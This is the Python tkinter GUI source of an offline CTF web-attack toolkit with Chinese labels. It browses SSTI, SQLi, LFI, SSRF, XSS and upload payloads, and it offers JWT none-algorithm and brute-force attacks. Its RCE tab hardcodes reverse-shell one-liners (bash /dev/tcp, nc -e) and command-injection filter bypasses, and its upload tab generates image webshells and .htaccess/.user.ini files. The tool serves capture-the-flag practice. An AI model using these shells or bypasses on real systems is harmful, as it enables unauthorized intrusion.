"""Yang-Web 图形界面 (tkinter).

零外部依赖，Python 自带 tkinter。
布局: 左侧功能树 + 右侧内容区，Tab 式切换。
"""
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import sys
import os

# 导入核心模块
from .core.decoder import chain_decode, brute_decode, detect_encoding, DECODERS
from .core.hashid import identify as hash_identify
from .core.jwt import decode_jwt, analyze_jwt, none_attack, brute_jwt, BUILTIN_WORDLIST
from .payloads import ssti, sqli, lfi, ssrf, xss, php, upload

try:
    from .payloads.rce import RCE_CMD, RCE_BYPASS
except Exception:
    RCE_CMD = {}
    RCE_BYPASS = {}


BG = "#1e1e2e"
FG = "#cdd6f4"
ACCENT = "#89b4fa"
GREEN = "#a6e3a1"
RED = "#f38ba8"
YELLOW = "#f9e2af"
DARK = "#181825"
INPUT_BG = "#313244"
BORDER = "#45475a"

# ── 主题 ──

def apply_theme(root):
    root.configure(bg=BG)
    style = ttk.Style()
    style.theme_use("clam")
    style.configure("TNotebook", background=BG, borderwidth=0)
    style.configure("TNotebook.Tab", background=DARK, foreground=FG, padding=[16, 8],
                    borderwidth=0, font=("Microsoft YaHei UI", 10))
    style.map("TNotebook.Tab", background=[("selected", INPUT_BG)], foreground=[("selected", ACCENT)])
    style.configure("TFrame", background=BG)
    style.configure("TLabel", background=BG, foreground=FG, font=("Microsoft YaHei UI", 10))
    style.configure("TButton", background=INPUT_BG, foreground=FG, borderwidth=1,
                    font=("Microsoft YaHei UI", 10))
    style.configure("TLabelframe", background=BG, foreground=ACCENT, borderwidth=1,
                    font=("Microsoft YaHei UI", 10, "bold"))
    style.configure("TLabelframe.Label", background=BG, foreground=ACCENT)
    style.configure("TCombobox", fieldbackground=INPUT_BG, background=INPUT_BG,
                    foreground=FG, selectbackground=ACCENT)

# ── 辅助 ──

def _scrollable_text(parent, height=12, width=80):
    frame = tk.Frame(parent, bg=BG)
    txt = tk.Text(frame, height=height, width=width, bg=INPUT_BG, fg=FG,
                  insertbackground=ACCENT, relief="flat", borderwidth=0,
                  font=("Cascadia Code", 10), padx=10, pady=8,
                  wrap=tk.WORD)
    scroll = tk.Scrollbar(frame, command=txt.yview)
    txt.configure(yscrollcommand=scroll.set)
    txt.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
    scroll.pack(side=tk.RIGHT, fill=tk.Y)
    return frame, txt

def _label(parent, text, fg=FG, font_size=10, bold=False, pady=4):
    w = tk.Label(parent, text=text, bg=BG, fg=fg,
                 font=("Microsoft YaHei UI", font_size, "bold" if bold else "normal"))
    w.pack(anchor="w", pady=(pady, 0))
    return w

def _button(parent, text, command, accent=False, width=None):
    bg = ACCENT if accent else INPUT_BG
    fg = DARK if accent else FG
    btn = tk.Button(parent, text=text, command=command, bg=bg, fg=fg,
                    activebackground=BORDER, activeforeground=FG, relief="flat",
                    borderwidth=0, padx=16, pady=6, cursor="hand2",
                    font=("Microsoft YaHei UI", 10, "bold" if accent else "normal"))
    if width:
        btn.configure(width=width)
    btn.pack(anchor="w", pady=2)
    return btn

def _entry(parent, width=60):
    e = tk.Entry(parent, bg=INPUT_BG, fg=FG, insertbackground=ACCENT,
                 relief="flat", borderwidth=0, font=("Cascadia Code", 11),
                 width=width)
    e.pack(fill=tk.X, pady=(2, 6), ipady=4)
    return e

def _combo(parent, values, default=None):
    cb = ttk.Combobox(parent, values=values, state="readonly",
                      font=("Cascadia Code", 10))
    if default:
        cb.set(default)
    cb.pack(fill=tk.X, pady=(2, 6))
    return cb

def _output_area(parent, height=18):
    """返回 (frame, text_widget) 方便需要自定义配置."""
    return _scrollable_text(parent, height=height)

def _append(txt_widget, text, tag=None):
    txt_widget.configure(state="normal")
    txt_widget.insert(tk.END, text)
    if tag:
        txt_widget.insert(tk.END, "\n")
    txt_widget.configure(state="disabled")
    txt_widget.see(tk.END)

def _clear_output(txt_widget):
    txt_widget.configure(state="normal")
    txt_widget.delete("1.0", tk.END)
    txt_widget.configure(state="disabled")


# ═══════════════════════════════════════════════════════════
#  各功能面板
# ═══════════════════════════════════════════════════════════

class DecodePanel(tk.Frame):
    """智能解码面板"""
    def __init__(self, parent):
        super().__init__(parent, bg=BG)
        _label(self, "🔓 智能解码器", fg=ACCENT, font_size=16, bold=True, pady=8)
        _label(self, "支持 14 种编码自动识别 + 递归链式解码 → 还原明文", fg=YELLOW, font_size=9)

        _label(self, "📥 输入密文:", pady=8)
        self.input_entry = _entry(self, 70)

        btn_frame = tk.Frame(self, bg=BG)
        btn_frame.pack(anchor="w", pady=4)
        tk.Button(btn_frame, text="🔍 自动解码", command=self._auto_decode,
                  bg=GREEN, fg=DARK, activebackground=ACCENT, relief="flat",
                  padx=20, pady=6, cursor="hand2",
                  font=("Microsoft YaHei UI", 11, "bold")).pack(side=tk.LEFT, padx=(0, 8))
        tk.Button(btn_frame, text="💣 暴力尝试", command=self._brute,
                  bg=YELLOW, fg=DARK, activebackground=ACCENT, relief="flat",
                  padx=20, pady=6, cursor="hand2",
                  font=("Microsoft YaHei UI", 11, "bold")).pack(side=tk.LEFT, padx=(0, 8))
        tk.Button(btn_frame, text="🗑 清空", command=lambda: (self.input_entry.delete(0, tk.END), _clear_output(self.output)),
                  bg=RED, fg=DARK, activebackground="#ff6b6b", relief="flat",
                  padx=16, pady=6, cursor="hand2",
                  font=("Microsoft YaHei UI", 10)).pack(side=tk.LEFT)

        _label(self, "📤 解码结果:", pady=8)
        self.output_frame, self.output = _output_area(self, 16)

    def _auto_decode(self):
        _clear_output(self.output)
        text = self.input_entry.get().strip()
        if not text:
            _append(self.output, "⚠ 请先输入密文")
            return
        _append(self.output, f"📋 输入 ({len(text)} 字符):\n  {text[:200]}\n\n")
        try:
            result = chain_decode(text)
            _append(self.output, f"🔓 链式解码:\n")
            for step in result["steps"]:
                _append(self.output, f"  Step {step['step']}: {step['from']} → {step['encoding']}")
                _append(self.output, f"           → {step['result'][:150]}\n")
            _append(self.output, f"\n✅ 最终结果: {result['result']}")
        except Exception as e:
            _append(self.output, f"❌ 解码失败: {e}")

    def _brute(self):
        _clear_output(self.output)
        text = self.input_entry.get().strip()
        if not text:
            _append(self.output, "⚠ 请先输入密文")
            return
        _append(self.output, f"📋 输入: {text}\n\n💣 暴力尝试所有解码器:\n\n")
        try:
            results = brute_decode(text)
            if not results:
                _append(self.output, "❌ 没有匹配到可读结果")
                return
            for r in results:
                _append(self.output, f"  • {r['encoding']}: {r['result'][:120]}\n")
        except Exception as e:
            _append(self.output, f"❌ 错误: {e}")


class PayloadPanel(tk.Frame):
    """通用 Payload 面板"""
    def __init__(self, parent, title, emoji, get_data_fn, search_fn=None):
        super().__init__(parent, bg=BG)
        self.get_data = get_data_fn
        self.search_fn = search_fn

        _label(self, f"{emoji} {title}", fg=ACCENT, font_size=16, bold=True, pady=8)

        # 分类选择
        top = tk.Frame(self, bg=BG)
        top.pack(fill=tk.X, pady=4)
        _label(top, "分类:", pady=0)
        self.category_var = tk.StringVar()
        self.category_combo = _combo(top, ["全部"])
        self.category_combo.bind("<<ComboboxSelected>>", lambda e: self._refresh())
        top.pack_forget()
        self.top_frame = top

        # 搜索
        search_frame = tk.Frame(self, bg=BG)
        search_frame.pack(fill=tk.X, pady=4)
        _label(search_frame, "🔍 搜索:", pady=0)
        self.search_entry = tk.Entry(search_frame, bg=INPUT_BG, fg=FG, insertbackground=ACCENT,
                                     relief="flat", borderwidth=0, font=("Cascadia Code", 11))
        self.search_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(8, 4), ipady=4)
        tk.Button(search_frame, text="搜索", command=self._search, bg=ACCENT, fg=DARK,
                  relief="flat", padx=12, pady=4, cursor="hand2",
                  font=("Microsoft YaHei UI", 9)).pack(side=tk.LEFT)

        self.output_frame, self.output = _output_area(self, 22)
        self._refresh()

    def _refresh(self):
        _clear_output(self.output)
        cat = self.category_var.get()
        try:
            data = self.get_data(cat if cat and cat != "全部" else "")
            self._display(data)
        except Exception as e:
            _append(self.output, f"❌ 错误: {e}")

    def _display(self, data):
        if isinstance(data, dict):
            for key, items in data.items():
                _append(self.output, f"\n▸ {key}\n")
                if isinstance(items, list):
                    show = items[:20] if len(items) > 20 else items
                    for item in show:
                        if isinstance(item, str):
                            _append(self.output, f"  • {item}")
                        elif isinstance(item, dict):
                            _append(self.output, f"  • {item.get('name','?')}")
                            if 'payload' in item:
                                _append(self.output, f"    {item['payload'][:150]}")
                            if 'tip' in item:
                                _append(self.output, f"    💡 {item['tip'][:120]}")
                    if len(items) > 20:
                        _append(self.output, f"  ... 还有 {len(items)-20} 项")
                else:
                    _append(self.output, f"  {items}")

    def _search(self):
        kw = self.search_entry.get().strip()
        if not kw or not self.search_fn:
            return
        _clear_output(self.output)
        results = self.search_fn(kw)
        if results:
            _append(self.output, f"🔍 '{kw}' 的搜索结果 ({len(results)} 条):\n")
            for r in results[:30]:
                cat = r.get("category", "")
                nm = r.get("name", "")
                payload = r.get("payload", r.get("content", ""))
                _append(self.output, f"\n  [{cat}] {nm}")
                if payload:
                    _append(self.output, f"  {str(payload)[:200]}")
        else:
            _append(self.output, f"未找到包含 '{kw}' 的结果")

    def set_categories(self, categories):
        self.category_combo["values"] = ["全部"] + list(categories)
        self.category_combo.set("全部")
        self.top_frame.pack(fill=tk.X, pady=4)


class HashPanel(tk.Frame):
    """Hash 识别面板"""
    def __init__(self, parent):
        super().__init__(parent, bg=BG)
        _label(self, "🔍 Hash 类型识别", fg=ACCENT, font_size=16, bold=True, pady=8)
        _label(self, "支持 40+ 种 Hash 算法自动匹配", fg=YELLOW, font_size=9)

        _label(self, "📥 输入 Hash:", pady=8)
        self.hash_entry = _entry(self, 70)
        self.hash_entry.bind("<Return>", lambda e: self._identify())

        tk.Button(self, text="🔍 识别", command=self._identify, bg=ACCENT, fg=DARK,
                  relief="flat", padx=20, pady=6, cursor="hand2",
                  font=("Microsoft YaHei UI", 11, "bold")).pack(anchor="w", pady=4)

        _label(self, "📤 识别结果:", pady=8)
        self.output_frame, self.output = _output_area(self, 14)

    def _identify(self):
        _clear_output(self.output)
        h = self.hash_entry.get().strip()
        if not h:
            _append(self.output, "⚠ 请先输入 Hash 值")
            return
        try:
            result = hash_identify(h)
            _append(self.output, f"📋 输入: {h[:80]}")
            _append(self.output, f"📏 长度: {len(h)} 字符")
            _append(self.output, f"\n📊 可能的算法:")
            if isinstance(result, list):
                for r in result:
                    _append(self.output, f"  • {r}")
            elif isinstance(result, dict):
                for algo, confidence in result.items():
                    _append(self.output, f"  • {algo} (置信度: {confidence})")
            else:
                _append(self.output, f"  {result}")
        except Exception as e:
            _append(self.output, f"❌ 错误: {e}")


class JWTPanel(tk.Frame):
    """JWT 分析面板"""
    def __init__(self, parent):
        super().__init__(parent, bg=BG)
        _label(self, "🔑 JWT 分析与攻击", fg=ACCENT, font_size=16, bold=True, pady=8)
        _label(self, "解析 → 分析 → None 攻击 → 弱密钥爆破 → 伪造", fg=YELLOW, font_size=9)

        _label(self, "📥 JWT Token:", pady=8)
        self.jwt_entry = _entry(self, 70)

        btn_frame = tk.Frame(self, bg=BG)
        btn_frame.pack(anchor="w", pady=4)
        for label, cmd in [("📋 解析", self._decode), ("🔍 分析", self._analyze),
                           ("⚡ None攻击", self._none), ("💣 弱密钥爆破", self._brute)]:
            tk.Button(btn_frame, text=label, command=cmd, bg=INPUT_BG, fg=FG,
                      activebackground=ACCENT, relief="flat", padx=12, pady=5,
                      cursor="hand2", font=("Microsoft YaHei UI", 10)).pack(side=tk.LEFT, padx=2)

        _label(self, "📤 结果:", pady=8)
        self.output_frame, self.output = _output_area(self, 16)

    def _get_token(self):
        return self.jwt_entry.get().strip()

    def _decode(self):
        _clear_output(self.output)
        t = self._get_token()
        if not t:
            _append(self.output, "⚠ 请输入 JWT")
            return
        try:
            header, payload = decode_jwt(t)
            _append(self.output, f"📋 Header:\n{_pretty_json(header)}\n")
            _append(self.output, f"📋 Payload:\n{_pretty_json(payload)}")
        except Exception as e:
            _append(self.output, f"❌ 错误: {e}")

    def _analyze(self):
        _clear_output(self.output)
        t = self._get_token()
        if not t: return
        try:
            r = analyze_jwt(t)
            for k, v in r.items():
                _append(self.output, f"{k}: {v}\n")
        except Exception as e:
            _append(self.output, f"❌ 错误: {e}")

    def _none(self):
        _clear_output(self.output)
        t = self._get_token()
        if not t: return
        try:
            r = none_attack(t)
            _append(self.output, f"⚡ None 算法攻击:\n{r}")
        except Exception as e:
            _append(self.output, f"❌ 错误: {e}")

    def _brute(self):
        _clear_output(self.output)
        t = self._get_token()
        if not t: return
        _append(self.output, "💣 弱密钥爆破中... (使用内置词库)\n")
        try:
            r = brute_jwt(t)
            if r:
                _append(self.output, f"✅ 密钥找到: {r}")
            else:
                _append(self.output, "❌ 内置词库未匹配")
        except Exception as e:
            _append(self.output, f"❌ 错误: {e}")


class ScriptsPanel(tk.Frame):
    """内嵌 CTF 脚本库面板"""
    def __init__(self, parent):
        super().__init__(parent, bg=BG)
        _label(self, "📦 内嵌 CTF 脚本库", fg=ACCENT, font_size=16, bold=True, pady=8)
        _label(self, "D:\\CTF常用脚本 直接内嵌 — 26 个脚本，一键调用", fg=YELLOW, font_size=9)

        # 搜索栏
        search_frame = tk.Frame(self, bg=BG)
        search_frame.pack(fill=tk.X, pady=(8, 4), padx=4)
        tk.Label(search_frame, text="🔍", bg=BG, fg=ACCENT,
                 font=("Microsoft YaHei UI", 12)).pack(side=tk.LEFT)
        self.search_entry = tk.Entry(search_frame, bg=INPUT_BG, fg=FG,
                                      insertbackground=ACCENT, relief="flat",
                                      font=("Cascadia Code", 11), width=30)
        self.search_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=8,
                               ipady=4)
        self.search_entry.bind("<KeyRelease>", self._do_search)

        # 分类按钮
        cat_frame = tk.Frame(self, bg=BG)
        cat_frame.pack(fill=tk.X, pady=4, padx=4)
        self.cat_buttons = {}
        for cat_key, cat_label in [("all", "全部"), ("crypto", "密码"),
                                    ("web", "Web"), ("reverse", "逆向"),
                                    ("misc", "杂项")]:
            btn = tk.Button(cat_frame, text=cat_label, relief="flat",
                           bg=INPUT_BG, fg=FG, activebackground=ACCENT,
                           activeforeground=DARK, padx=12, pady=4,
                           cursor="hand2", font=("Microsoft YaHei UI", 9),
                           command=lambda c=cat_key: self._filter_cat(c))
            btn.pack(side=tk.LEFT, padx=2)
            self.cat_buttons[cat_key] = btn

        # 脚本列表（左侧）
        panes = tk.PanedWindow(self, bg=BG, sashwidth=3)
        panes.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)

        list_frame = tk.Frame(panes, bg=BG)
        panes.add(list_frame, width=320)

        _label(list_frame, "脚本列表:", pady=4)
        self.script_list = tk.Listbox(list_frame, bg=INPUT_BG, fg=FG,
                                       selectbackground=ACCENT,
                                       selectforeground=DARK,
                                       relief="flat", borderwidth=0,
                                       font=("Microsoft YaHei UI", 10),
                                       height=20)
        self.script_list.pack(fill=tk.BOTH, expand=True, pady=(0, 4))
        self.script_list.bind("<<ListboxSelect>>", self._on_select)

        # 详情/输出区（右侧）
        detail_frame = tk.Frame(panes, bg=BG)
        panes.add(detail_frame, width=600)

        _label(detail_frame, "详情 & 输出:", pady=4)
        self.detail_frame, self.detail_output = _output_area(detail_frame, 18)
        self.detail_frame.pack(fill=tk.BOTH, expand=True)

        # 运行按钮
        btn_bar = tk.Frame(detail_frame, bg=BG)
        btn_bar.pack(fill=tk.X, pady=4)
        tk.Button(btn_bar, text="▶ 运行脚本", command=self._run_selected,
                  bg=GREEN, fg=DARK, activebackground=ACCENT, relief="flat",
                  padx=20, pady=6, cursor="hand2",
                  font=("Microsoft YaHei UI", 11, "bold")).pack(side=tk.LEFT, padx=(0, 8))
        tk.Button(btn_bar, text="🗑 清空", command=lambda: _clear_output(self.detail_output),
                  bg=RED, fg=DARK, activebackground="#ff6b6b", relief="flat",
                  padx=16, pady=6, cursor="hand2",
                  font=("Microsoft YaHei UI", 10)).pack(side=tk.LEFT)

        self._all_scripts = []
        self._current_key = None
        self._populate_list()

    def _populate_list(self, category=None, query=None):
        self.script_list.delete(0, tk.END)
        self._all_scripts = []
        try:
            from .scripts.registry import SCRIPTS, CATEGORIES
            for key, meta in sorted(SCRIPTS.items(), key=lambda x: x[0]):
                if category and category != "all" and meta["category"] != category:
                    continue
                if query and query.lower() not in key.lower() and query.lower() not in meta["title"].lower() and query.lower() not in meta["description"].lower():
                    continue
                cat_icon = CATEGORIES.get(meta["category"], "📦")
                deps = f" [需: {','.join(meta['deps'])}]" if meta["deps"] else ""
                display = f"{cat_icon} {meta['title']}{deps}"
                self.script_list.insert(tk.END, display)
                self._all_scripts.append((key, meta))
        except Exception as e:
            self.script_list.insert(tk.END, f"加载失败: {e}")

    def _filter_cat(self, cat):
        for k, btn in self.cat_buttons.items():
            if k == cat:
                btn.configure(bg=ACCENT, fg=DARK)
            else:
                btn.configure(bg=INPUT_BG, fg=FG)
        self._populate_list(category=cat)

    def _do_search(self, event):
        q = self.search_entry.get().strip()
        self._populate_list(query=q if q else None)

    def _on_select(self, event):
        sel = self.script_list.curselection()
        if not sel:
            return
        idx = sel[0]
        if idx >= len(self._all_scripts):
            return
        key, meta = self._all_scripts[idx]
        self._current_key = key
        _clear_output(self.detail_output)
        _append(self.detail_output, f"📝 {meta['title']}\n")
        _append(self.detail_output, f"{'─' * 50}\n")
        _append(self.detail_output, f"分类: {meta['category']}\n")
        _append(self.detail_output, f"描述: {meta['description']}\n")
        _append(self.detail_output, f"用法: {meta['usage']}\n")
        _append(self.detail_output, f"输入: {meta['input_type']}  →  输出: {meta['output_type']}\n")
        if meta["deps"]:
            _append(self.detail_output, f"⚠ 依赖: {', '.join(meta['deps'])}\n")
        else:
            _append(self.detail_output, f"✅ 零依赖 (纯标准库)\n")

    def _run_selected(self):
        if not self._current_key:
            _clear_output(self.detail_output)
            _append(self.detail_output, "⚠ 请先选择一个脚本")
            return
        try:
            from .scripts.runner import run_script as _run
            meta = None
            for k, m in self._all_scripts:
                if k == self._current_key:
                    meta = m
                    break
            _clear_output(self.detail_output)
            _append(self.detail_output, f"🚀 运行: {meta['title'] if meta else self._current_key}\n")
            _append(self.detail_output, f"{'─' * 50}\n\n")
            result = _run(self._current_key)
            if result["stdout"]:
                _append(self.detail_output, result["stdout"])
            if result["stderr"]:
                _append(self.detail_output, f"\n⚠ 错误输出:\n{result['stderr']}")
            if result["success"]:
                _append(self.detail_output, f"\n{'─' * 50}\n✅ 脚本执行成功")
            else:
                _append(self.detail_output, f"\n{'─' * 50}\n❌ 脚本执行失败 (code={result['exit_code']})")
        except Exception as e:
            _clear_output(self.detail_output)
            _append(self.detail_output, f"❌ 运行出错: {e}")


def _pretty_json(obj):
    import json
    return json.dumps(obj, indent=2, ensure_ascii=False)


# ═══════════════════════════════════════════════════════════
#  主窗口
# ═══════════════════════════════════════════════════════════

def run_gui():
    root = tk.Tk()
    root.title("Yang-Web Arsenal — 离线 CTF Web 工具箱")
    root.geometry("1100x720")
    root.minsize(900, 600)
    apply_theme(root)

    # 顶部标题栏
    header = tk.Frame(root, bg=DARK, height=52)
    header.pack(fill=tk.X)
    header.pack_propagate(False)
    tk.Label(header, text="🔧  Yang-Web", bg=DARK, fg=ACCENT,
             font=("Cascadia Code", 16, "bold")).pack(side=tk.LEFT, padx=20, pady=10)
    tk.Label(header, text="离线 CTF Web 瑞士军刀  ·  零依赖  ·  15 个模块 + 26 内嵌脚本",
             bg=DARK, fg=YELLOW, font=("Microsoft YaHei UI", 9)).pack(side=tk.LEFT, pady=14)

    # Tab 页
    notebook = ttk.Notebook(root)
    notebook.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)

    # 解码
    decode_panel = DecodePanel(notebook)
    notebook.add(decode_panel, text=" 🔓 解码 ")

    # Payload 面板们
    def _add_payload_tab(title, emoji, module, get_fn, search_fn=None):
        panel = PayloadPanel(notebook, title, emoji, get_fn, search_fn)
        if hasattr(module, 'EXPLOIT') and module.EXPLOIT:
            panel.set_categories(module.EXPLOIT.keys())
        elif hasattr(module, 'EXT_BYPASS'):
            panel.set_categories(["后缀绕过", "MIME伪造", "内容绕过", "解析漏洞", "高级技巧"])
        notebook.add(panel, text=f" {emoji} {title} ")
        return panel

    _add_payload_tab("SSTI", "🎨", ssti, ssti.get_exploit)
    _add_payload_tab("SQLi", "🗄️", sqli, sqli.get_exploit, sqli.search_payload)
    _add_payload_tab("LFI", "📂", lfi, lfi.get_path_traversal)
    _add_payload_tab("SSRF", "🌐", ssrf, ssrf.get_cloud_metadata)
    _add_payload_tab("XSS", "💉", xss, xss.get_detection)
    _add_payload_tab("PHP", "🐘", php, lambda _: {
        "Magic Hash": php.MAGIC_HASHES.get("MD5 (0e...)", [])[:15],
        "弱类型比较": [i["example"] for items in php.TYPE_JUGGLING.values() for i in items],
        "RCE Bypass": php.PHP_RCE_BYPASS.get("常见命令执行函数", [])[:15],
    })

    # Upload
    def _upload_get(_):
        return {
            "后缀绕过": upload.EXT_BYPASS.get("黑名单未覆盖后缀", []),
            "大小写混合": upload.EXT_BYPASS.get("大小写混合", []),
            "多后缀": upload.EXT_BYPASS.get("多后缀组合", []),
            "空格点(Win)": upload.EXT_BYPASS.get("空格/点技巧 (Win)", []),
            "NTFS流": upload.EXT_BYPASS.get("NTFS 数据流 (Win)", []),
            "图片马内容绕过": [p for items in upload.CONTENT_BYPASS.values() for p in items[:3]],
            "一句话图片马": [
                upload.generate_image_shell("eval"),
                upload.generate_image_shell("system"),
                upload.generate_image_shell("one_liner"),
            ],
            ".htaccess/.user.ini": [
                upload.generate_htaccess(),
                upload.generate_userini(),
                upload.generate_userini("shell.jpg"),
            ],
        }
    _add_payload_tab("Upload", "📤", upload, _upload_get)

    # RCE
    def _rce_get(_):
        return {
            "反弹Shell": ["bash -i >& /dev/tcp/IP/PORT 0>&1",
                          "nc -e /bin/sh IP PORT",
                          "python -c 'import socket,subprocess,os;...'",
                          "php -r '$sock=fsockopen(...);'",
                          "powershell -c \"$c=New-Object ...\""],
            "命令注入链接符": [";", "|", "||", "&&", "&", "\\n", "%0a", "`"],
            "空格绕过": ["${IFS}", "$IFS$9", "<>", "{ls,-la}", "%09"],
            "关键字绕过": ["c''at", "c\\at", "ca$*t", "/???/c?t"],
        }
    _add_payload_tab("RCE", "💻", None, _rce_get)

    # Hash
    notebook.add(HashPanel(notebook), text=" 🔍 Hash ")

    # JWT
    notebook.add(JWTPanel(notebook), text=" 🔑 JWT ")

    # Scripts — 内嵌 CTF 脚本库
    notebook.add(ScriptsPanel(notebook), text=" 📦 脚本库 ")

    # 底部状态栏
    status = tk.Frame(root, bg=DARK, height=28)
    status.pack(fill=tk.X, side=tk.BOTTOM)
    status.pack_propagate(False)
    tk.Label(status, text="Yang-Web v1.2.0  |  零依赖  |  Python 标准库  |  26 个内嵌脚本  |  Ctrl+C 复制选中文本",
             bg=DARK, fg=BORDER, font=("Microsoft YaHei UI", 8)).pack(side=tk.LEFT, padx=16, pady=4)

    root.mainloop()


if __name__ == "__main__":
    run_gui()
